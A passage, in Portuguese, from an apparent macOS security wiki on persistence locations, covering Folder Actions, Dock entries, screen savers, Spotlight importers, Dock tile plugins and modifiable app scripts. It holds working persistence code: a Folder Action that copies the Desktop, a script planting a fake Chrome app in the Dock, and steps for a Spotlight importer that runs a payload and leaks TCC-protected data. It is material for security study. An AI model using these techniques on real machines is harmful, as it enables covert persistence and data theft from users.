- `019bdcd2` - horário em hexadecimal. Representa os minutos decorridos desde o epoch. `0x019bdcd2` equivale a `26991826` em decimal. Se multiplicarmos por 60, obtemos `1619509560`, que corresponde a `GMT: terça-feira, 27 de abril de 2021, 7:46:00`.

Se imprimirmos o arquivo do job, veremos que ele contém as mesmas informações obtidas com `at -c`.

### Alertas do Calendar para abrir arquivos

- **Alvo de gravação:** Um app bundle executável ou outro arquivo **já selecionado** pelo alerta personalizado **Open file** de um evento do Calendar. Criar ou editar o próprio alerta requer acesso ao evento do calendário por meio do Calendar ou de uma fonte de dados de calendário aceita; uma gravação aleatória de arquivo não cria um alerta.
- **Trigger:** O horário programado do alerta em um Mac onde o Calendar processa o evento. Um evento recorrente pode repetir a ação. [O guia atual do Calendar da Apple](https://support.apple.com/guide/calendar/icl1012/mac) confirma a opção de alerta **Custom → Open file** no macOS 26.
- **Identidade de execução e restrições:** O Calendar abre o arquivo escolhido para o usuário conectado por meio do aplicativo associado. Abrir um app bundle pode executar seu código como esse usuário, sujeito ao Gatekeeper, à quarentena e a outras verificações do macOS. Um arquivo de script simples pode apenas abrir em um editor; sua extensão, por si só, não comprova a execução de código.

Para avaliar um possível alvo com segurança, inspecione o alerta do evento no Calendar e as permissões do arquivo selecionado. Este caminho foi documentado com base no guia da Apple e **não** foi testado no Mac de pesquisa, pois o teste modificaria um calendário ativo e exigiria esperar por um evento na área de trabalho. Em uma conta descartável, é possível selecionar um app bundle que apenas crie um marcador, configurar um alerta Open file para um horário próximo, confirmar a abertura e excluir o evento e o app depois.

### Automações do Shortcuts no macOS

- **Alvo de gravação:** Um arquivo executável **já referenciado** pela ação de um atalho ou um atalho existente que um usuário autorizado possa editar. Um arquivo `.shortcut` aleatório ou uma gravação em um banco de dados não documentado do Shortcuts não é um método compatível para registrar uma automação.
- **Trigger e identidade:** Um evento de automação previamente configurado e ativado, como um horário do dia ou um evento de app, executa o atalho para o usuário conectado. [O guia atual de automação do Mac da Apple](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) lista os eventos compatíveis, explica quando uma automação pode ser executada sem pedir confirmação e descreve como remover um trigger. [O guia de privacidade do Shortcuts da Apple](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) exige **Allow Running Scripts** para ações de script, e ações individuais ainda podem solicitar permissões.

Este é um caminho condicional de gravação para execução **somente quando a ação existente carrega um alvo gravável**. Criar uma automação pela interface altera configurações ativas e não foi tentado no Mac de pesquisa. Em uma conta descartável, o proprietário pode configurar um atalho por horário que execute um script para tocar em `/tmp/ht-shortcuts-marker`, ativar as permissões necessárias, confirmar a criação do marcador após o evento e, em seguida, excluir a automação, o atalho e o marcador.

### Ações do Automator e Quick Actions

- **Alvos de gravação:** `~/Library/Automator/*.action` (usuário) e `/Library/Automator/*.action` (administrador) para action bundles. Um workflow Quick Action salvo costuma ficar em `~/Library/Services/*.workflow`; verifique o caminho real do workflow selecionado pelo usuário. [A referência do framework Automator da Apple](https://developer.apple.com/documentation/automator) lista os diretórios de busca de ações.
- **Trigger:** O Automator carrega os action bundles disponíveis ao ser executado, mas a tarefa de uma ação é executada quando um workflow que a utiliza é executado. Uma Quick Action é executada quando o usuário a seleciona no Finder, em Services ou em outro menu disponível. Um workflow Folder Action é executado quando itens são adicionados à pasta **já associada**, e um workflow Calendar Alarm é executado no horário do evento. [Os tipos de workflow da Apple](https://support.apple.com/guide/automator/aut7cac58839/mac) distinguem esses eventos. Apenas gravar uma ação ou um workflow não associa uma pasta nem agenda um evento no calendário.
- **Identidade de execução e restrições:** A conta que executa o workflow; o Automator ou o app que o invoca precisa carregar a ação, e as verificações atuais de assinatura de código ou privacidade precisam permitir sua execução. Um action bundle gravável já referenciado por um workflow ativo é um caso diferente de instalar uma nova ação e esperar que ela seja selecionada.

Os diretórios `Automator` e `Services` do usuário estavam presentes no Mac de teste com macOS 26.5.2; `/Library/Automator` não existia. Nenhum workflow ativo foi criado, associado ou executado. Use uma conta descartável e uma ação/workflow que apenas crie um marcador para confirmar um caminho específico de carregamento. A seção [Folder Actions](#folder-actions) trata essa fonte de eventos com mais detalhes.

### Folder Actions

Relato: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Relato: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Útil para contornar o sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Mas é necessário conseguir chamar `osascript` com argumentos para contatar **`System Events`** e configurar Folder Actions
- Bypass de TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Tem algumas permissões básicas de TCC, como Desktop, Documents e Downloads

#### Localização

- **`/Library/Scripts/Folder Action Scripts`**
  - Requer root
  - **Trigger**: Acesso à pasta especificada
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Trigger**: Acesso à pasta especificada

#### Descrição e exploração

Folder Actions são scripts acionados automaticamente por alterações em uma pasta, como adicionar ou remover itens, ou por outras ações, como abrir ou redimensionar a janela da pasta. Essas ações podem ser usadas para várias tarefas e acionadas de diferentes maneiras, como pela interface do Finder ou por comandos de terminal.<sup>[[17]](#references)[[18]](#references)</sup>

Para configurar Folder Actions, há opções como:

1. Criar um workflow Folder Action com o [Automator](https://support.apple.com/guide/automator/welcome/mac) e instalá-lo como um serviço.
2. Associar um script manualmente por meio de Folder Actions Setup, no menu de contexto de uma pasta.
3. Usar OSAScript para enviar mensagens Apple Event ao `System Events.app` e configurar uma Folder Action programaticamente.
   - Esse método é especialmente útil para incorporar a ação ao sistema, oferecendo um nível de persistência.

O script a seguir é um exemplo do que pode ser executado por uma Folder Action:

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Para que o script acima possa ser usado pelas Folder Actions, compile-o usando:

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Após compilar o script, configure as Ações de Pasta executando o script abaixo. Esse script habilitará as Ações de Pasta globalmente e anexará especificamente o script compilado anteriormente à pasta Mesa.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Execute o script de configuração com:

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- Esta é a maneira de implementar essa persistência via GUI:

Este é o script que será executado:

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Compile-o com: `osacompile -l JavaScript -o folder.scpt source.js`

Mova-o para:

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Em seguida, abra o app `Folder Actions Setup`, selecione a **pasta que você gostaria de monitorar** e, no seu caso, selecione **`folder.scpt`** (no meu caso, chamei de output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Agora, se você abrir essa pasta com o **Finder**, seu script será executado.

Essa configuração foi armazenada no **plist** localizado em **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**, no formato base64.

Agora, vamos tentar preparar essa persistência sem acesso à GUI:

1. **Copie `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** para `/tmp` para fazer um backup:
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Remova** as Folder Actions que você acabou de configurar:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Agora que temos um ambiente vazio

3. Copie o arquivo de backup: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Abra o Folder Actions Setup.app para carregar essa configuração: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Isso não funcionou para mim, mas estas são as instruções do writeup:(

### Atalhos do Dock

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Mas você precisa ter instalado um aplicativo malicioso no sistema
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- `~/Library/Preferences/com.apple.dock.plist`
  - **Gatilho**: Quando o usuário clica no app dentro do Dock

#### Descrição e exploração

Todos os aplicativos que aparecem no Dock são especificados no plist: **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

É possível **adicionar um aplicativo** apenas com:

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

Usando um pouco de **social engineering**, você poderia se passar, por exemplo, pelo Google Chrome no Dock e executar seu próprio script:

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Métodos de entrada

- **Alvo de gravação:** Um bundle de app de método de entrada que contém código, instalado em `~/Library/Input Methods/` (usuário) ou `/Library/Input Methods/` (administrador). Isso é diferente dos arquivos de mapeamento de teclado `.inputplugin` de texto simples da Apple, que, por si só, não são um payload de código arbitrário.
- **Acionamento:** O usuário adiciona/ativa a fonte de entrada em **Ajustes do Sistema → Teclado → Entrada de Texto** e, em seguida, seleciona-a ou usa-a. O simples fato de um bundle ser copiado para o diretório não prova que o macOS irá iniciá-lo. O [guia atual da Apple sobre fontes de entrada](https://support.apple.com/guide/mac-help/mchl84525d76/mac) descreve como ativar e alternar fontes; a [documentação InputMethodKit da Apple](https://developer.apple.com/documentation/inputmethodkit) aborda métodos de entrada que contêm código.
- **Identidade de execução e controles:** O método é executado para o usuário conectado, sujeito ao registro do método de entrada, à assinatura de código e às verificações de segurança atuais do macOS. Métodos existentes e ativados cujo executável pode ser escrito exigem uma análise separada do caminho e da assinatura.

A [nota antiga da Apple sobre métodos de entrada de terceiros](https://developer.apple.com/library/archive/qa/qa1810/_index.html) já alertava que copiar certos métodos de paleta para esses diretórios nem sequer faz com que apareçam em Fontes de Entrada. No Mac de pesquisa com macOS 26.5.2, o diretório do usuário existe, mas nenhum bundle foi instalado ou ativado; portanto, este é um caminho condicional documentado, não um resultado de execução local.

### Seletores de cor

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Útil para contornar o sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Uma ação muito específica precisa ocorrer
  - Você acabará em outro sandbox
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- `/Library/ColorPickers`
  - Requer root
  - Acionamento: usar o seletor de cor
- `~/Library/ColorPickers`
  - Acionamento: usar o seletor de cor

#### Descrição e exploit

**Compile** um bundle de seletor de cor com seu código (você pode usar [**este, por exemplo**](https://github.com/viktorstrate/color-picker-plus)) e adicione um construtor (como na seção [Protetor de tela](macos-auto-start-locations.md#screen-saver)); depois, copie o bundle para `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Então, quando o seletor de cor for acionado, seu bundle também deverá ser executado.

Isso depende de um app compatível abrir o painel de cores do sistema e selecionar o seletor instalado. O [guia da Apple sobre o painel de cores](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) descreve os locais legados dos bundles. Uma verificação local do caminho encontrou o serviço XPC legado do seletor de cor, mas nenhum seletor foi instalado ou carregado no Mac de pesquisa; não deduza um bypass de TCC apenas com base no caminho.

Observe que o binário que carrega sua biblioteca tem um **sandbox muito restritivo**: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Finder Sync Plugins

**Relato**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Relato**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Útil para ignorar o sandbox: **Não, porque é necessário executar seu próprio app**
- Bypass de TCC: Depende do sandbox e das permissões da extensão ativada; não foi estabelecido nenhum bypass geral.

#### Localização

- Um app específico

#### Descrição e Exploração

Um exemplo de aplicativo com uma Finder Sync Extension [**pode ser encontrado aqui**](https://github.com/D00MFist/InSync).

Os aplicativos podem ter `Finder Sync Extensions`. Essa extensão fica dentro de um aplicativo que será executado. Além disso, para que a extensão possa executar seu código, ela **precisa ser assinada** com algum certificado válido de desenvolvedor Apple, precisa estar **em sandbox** (embora seja possível adicionar exceções mais permissivas) e precisa ser registrada com algo como:<sup>[[21]](#references)[[22]](#references)</sup>

Uma extensão instalada também precisa estar **ativada** e ser invocada para uma localização ou item relevante do Finder; gravar um bundle `.appex` arbitrário não é suficiente. A [API Finder Sync da Apple](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) expõe o estado de ativação. Os comandos `pluginkit` abaixo ilustram o registro e a ativação explícitos, não uma inicialização automática baseada apenas na existência de um arquivo. Essa abordagem foi revisada com base na documentação, sem instalar ou ativar nenhuma extensão nova no Mac de pesquisa.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Protetor de tela

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Útil para bypass de sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Mas você acabará em um sandbox comum de aplicativo
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- `/System/Library/Screen Savers`
  - Requer root
  - **Acionamento**: Selecione o protetor de tela
- `/Library/Screen Savers`
  - Requer root
  - **Acionamento**: Selecione o protetor de tela
- `~/Library/Screen Savers`
  - **Acionamento**: Selecione o protetor de tela

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Descrição e exploração

Crie um novo projeto no Xcode e selecione o template para gerar um novo **protetor de tela**. Em seguida, adicione seu código a ele, por exemplo, o código a seguir para gerar logs.<sup>[[23]](#references)[[24]](#references)</sup>

**Compile-o** e copie o bundle `.saver` para **`~/Library/Screen Savers`**. Em seguida, abra a GUI do protetor de tela e, se você simplesmente clicar nele, ele deverá gerar muitos logs:

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Observe que, como você pode encontrar **`com.apple.security.app-sandbox`** nos entitlements do binário que carrega este código (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), você estará **dentro do sandbox comum de aplicativos**.

Código do protetor de tela:

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Plugins do Spotlight

relatório: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Útil para bypass de sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Mas você acabará em um sandbox de aplicativo
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - O sandbox parece muito limitado

#### Localização

- `~/Library/Spotlight/`
  - **Gatilho**: É criado um novo arquivo com uma extensão gerenciada pelo plugin do Spotlight.
- `/Library/Spotlight/`
  - **Gatilho**: É criado um novo arquivo com uma extensão gerenciada pelo plugin do Spotlight.
  - Requer root
- `/System/Library/Spotlight/`
  - **Gatilho**: É criado um novo arquivo com uma extensão gerenciada pelo plugin do Spotlight.
  - Requer root
- `Some.app/Contents/Library/Spotlight/`
  - **Gatilho**: É criado um novo arquivo com uma extensão gerenciada pelo plugin do Spotlight.
  - Requer um novo aplicativo

#### Descrição e exploração

O Spotlight é o recurso de busca integrado ao macOS, projetado para oferecer aos usuários **acesso rápido e abrangente aos dados em seus computadores**.\
Para facilitar essa busca rápida, o Spotlight mantém um **banco de dados proprietário** e cria um índice **analisando a maioria dos arquivos**, permitindo buscas rápidas tanto pelos nomes dos arquivos quanto por seu conteúdo.<sup>[[25]](#references)</sup>

O mecanismo subjacente do Spotlight envolve um processo central chamado 'mds', que significa **'metadata server'**. Esse processo coordena todo o serviço do Spotlight. Além dele, há vários daemons 'mdworker' que executam diversas tarefas de manutenção, como indexar diferentes tipos de arquivo (`ps -ef | grep mdworker`). Essas tarefas são possíveis graças aos plugins importadores do Spotlight, ou **".mdimporter bundles**", que permitem ao Spotlight compreender e indexar conteúdo em diversos formatos de arquivo.

Os plugins ou bundles **`.mdimporter`** ficam nos locais mencionados anteriormente. Um novo bundle precisa ser descoberto e corresponder a um tipo de arquivo, e o Spotlight precisa realmente indexar um arquivo correspondente; copiar um bundle, por si só, não comprova que ele foi carregado. A [referência MDImporter da Apple](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) relaciona o carregamento a um arquivo elegível que tenha sido alterado. A execução de importadores do Spotlight no macOS 26 não foi testada aqui.

É possível **encontrar todos os `mdimporters`** carregados executando:

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

E, por exemplo, **/Library/Spotlight/iBooksAuthor.mdimporter** é usado para analisar esse tipo de arquivo (extensões `.iba` e `.book`, entre outras):

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> Se você verificar o Plist de outros `mdimporter`, talvez não encontre a entrada **`UTTypeConformsTo`**. Isso acontece porque esse é um _Uniform Type Identifier_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier) — Identificador de Tipo Uniforme) integrado, e não é necessário especificar extensões.
>
> Além disso, os plugins padrão do sistema sempre têm precedência. Portanto, um invasor só pode acessar arquivos que não sejam indexados pelos próprios `mdimporters` da Apple.

Para criar seu próprio importer, você pode começar com este projeto: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), depois alterar o nome e **`CFBundleDocumentTypes`**, e adicionar **`UTImportedTypeDeclarations`** para que ele ofereça suporte à extensão desejada e reflita essas alterações em **`schema.xml`**.\
Em seguida, **altere** o código da função **`GetMetadataForFile`** para executar seu payload quando um arquivo com a extensão processada for criado.

Por fim, **compile e copie seu novo `.mdimporter`** para um dos três locais anteriores. Você pode verificar se ele foi carregado **monitorando os logs** ou executando **`mdimport -L`**.

> [!TIP]
> Embora o sandbox do importer seja muito restritivo, `mdworker` indexa arquivos com **acesso privilegiado de leitura**. Portanto, um `.mdimporter` malicioso pode ler o *conteúdo* de arquivos em locais protegidos pelo TCC (Downloads, Pictures, Desktop, …) e exfiltrar metadados coletados sem qualquer prompt do TCC — o **bypass de TCC "Sploitlight" (CVE-2025-31199)**, corrigido no macOS Sequoia 15.4.<sup>[[55]](#references)</sup>

Para a técnica distinta do macOS 26 que transporta bytes protegidos em **nomes de notificações Darwin**, em vez de logs do sistema, consulte [Vazamento por importer do Spotlight via nomes de notificações Darwin](macos-security-and-privilege-escalation/macos-security-protections/macos-tcc/macos-tcc-bypasses/#spotlight-importer-leakage-via-darwin-notification-names).<sup>[[57]](#references)</sup>

### ~~Painel de Preferências~~

> [!CAUTION]
> Parece que isso não funciona mais.

Relato: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Útil para bypass de sandbox: [🟠](https://emojipedia.org/large-orange-circle)
  - Requer uma ação específica do usuário
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Descrição

Parece que isso não funciona mais.<sup>[[26]](#references)</sup>

### Arquivos de Script de Aplicativos

Relato: [https://theevilbit.github.io/beyond/beyond_0010/](https://theevilbit.github.io/beyond/beyond_0010/)<sup>[[37]](#references)</sup>

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Mas é necessário que o aplicativo visado esteja instalado e seja executado/usado pela vítima
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

Um **script interpretado que um aplicativo ou ferramenta instalada realmente executa** e que o agente pode modificar. Confirme as permissões do arquivo e o caminho de chamada; encontrar um arquivo `.sh` ou `.py`, por si só, não é suficiente. O [guia de assinatura de código](https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/Procedures/Procedures.html) da Apple afirma que bundles de aplicativos assinados selam recursos, incluindo scripts. Editar um script dentro do bundle rompe esse selo e pode ser detectado ou bloqueado durante a validação do bundle. Um script externo, como o launcher do Homebrew, tem comportamento diferente de assinatura e confiança. Os exemplos históricos do relato incluem:

- **`/Applications/Sublime Text.app/Contents/MacOS/sublime.py`** – script usado por versões antigas do Sublime Text; é necessário verificar se o arquivo existe e se é usado na inicialização pela versão instalada. Ele não estava presente no Mac de teste.
- **`/opt/homebrew/bin/brew`** (Apple Silicon) ou **`/usr/local/bin/brew`** (Intel) – launcher Bash executado quando o caminho `brew` correspondente é invocado, se estiver instalado e puder ser escrito pelo agente. `/opt/homebrew/bin/brew` era um script Bash gravável no Mac de teste; isso é uma observação local, não uma regra geral de permissões do Homebrew.
- **`idlemain.py`** do IDLE, dentro de um bundle de aplicativo Python – pode exigir permissões de administrador para gravação, mas é executado com a identidade do usuário do IDLE.
- **`/Library/Application Support/Wireshark/ChmodBPF/ChmodBPF`** – script de shell histórico executado como root quando o job launchd correspondente `org.wireshark.ChmodBPF` está instalado. O script e o job não estavam presentes no Mac de teste.

#### Descrição e exploração

Algumas ferramentas e aplicativos executam scripts interpretados em tempo de execução. Um script gravável pode executar comandos adicionados na próxima vez que seu chamador específico for executado, desde que a validação de assinatura, o quarantine e outras verificações permitam. A pesquisa original demonstrou várias instalações de 2019; verifique novamente os caminhos e gatilhos na versão visada.<sup>[[37]](#references)</sup>

```python
# Marker-only injection test on a COPY of Homebrew's launcher. The relocated
# copy may fail its normal Homebrew logic; the marker checks script execution.
import pathlib, subprocess, tempfile

source = pathlib.Path('/opt/homebrew/bin/brew')
with tempfile.TemporaryDirectory(prefix='ht-script-copy-') as root:
    target = pathlib.Path(root) / 'brew'
    marker = pathlib.Path(root) / 'ran'
    lines = source.read_text().splitlines(keepends=True)
    target.write_text(lines[0] + '/usr/bin/touch ' + str(marker) + '\n' + ''.join(lines[1:]))
    target.chmod(0o700)
    subprocess.run([str(target), '--version'], capture_output=True, timeout=15)
    print('marker fired:', marker.exists())
```

Este teste de cópia produziu `marker fired: True` no macOS 26.5.2; o launcher original permaneceu intacto. Isso comprova que o ponto de inserção é executado na cópia, não que um app bundle assinado modificado ou uma instalação real do Homebrew passaria por todas as verificações de inicialização.

### Dock Tile Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0032/](https://theevilbit.github.io/beyond/beyond_0032/)<sup>[[38]](#references)</sup>

- Útil para bypass de sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Requer que um app que declare o plug-in seja descoberto/registrado e processado pelo Dock
  - O plugin é carregado em um helper **assinado pela Apple** que não tem entitlement de app-sandbox e tem a validação de biblioteca desativada. Esse helper não foi mostrado na interface de gerenciamento de tarefas em segundo plano na pesquisa citada; a visibilidade em uma versão-alvo deve ser verificada.
- Bypass de TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Localização

- **`<App>.app/Contents/PlugIns/<name>.docktileplugin`**, referenciado com a chave **`NSDockTilePlugIn`** no `Info.plist` do app; o próprio `Info.plist` do plugin define **`NSPrincipalClass`**.

#### Descrição e exploração

Quando um app declara `NSDockTilePlugIn`, o Dock pode carregar o bundle referenciado no helper XPC **`com.apple.dock.external.extra`** (`...extra.arm64` em Apple Silicon) no login ou quando seu tile é adicionado; o próprio app não precisa ser iniciado. Isso requer que o app seja descoberto/registrado e aceito pelo macOS. O helper é **assinado pela Apple**, não tem o entitlement `com.apple.security.app-sandbox` e tem `com.apple.security.cs.disable-library-validation`. O método **`setDockTile:`** da classe principal é invocado ao carregar; a partir daí, ele pode se inscrever em notificações distribuídas (por exemplo, `com.apple.screenIsLocked`) para eventos posteriores.<sup>[[38]](#references)</sup>

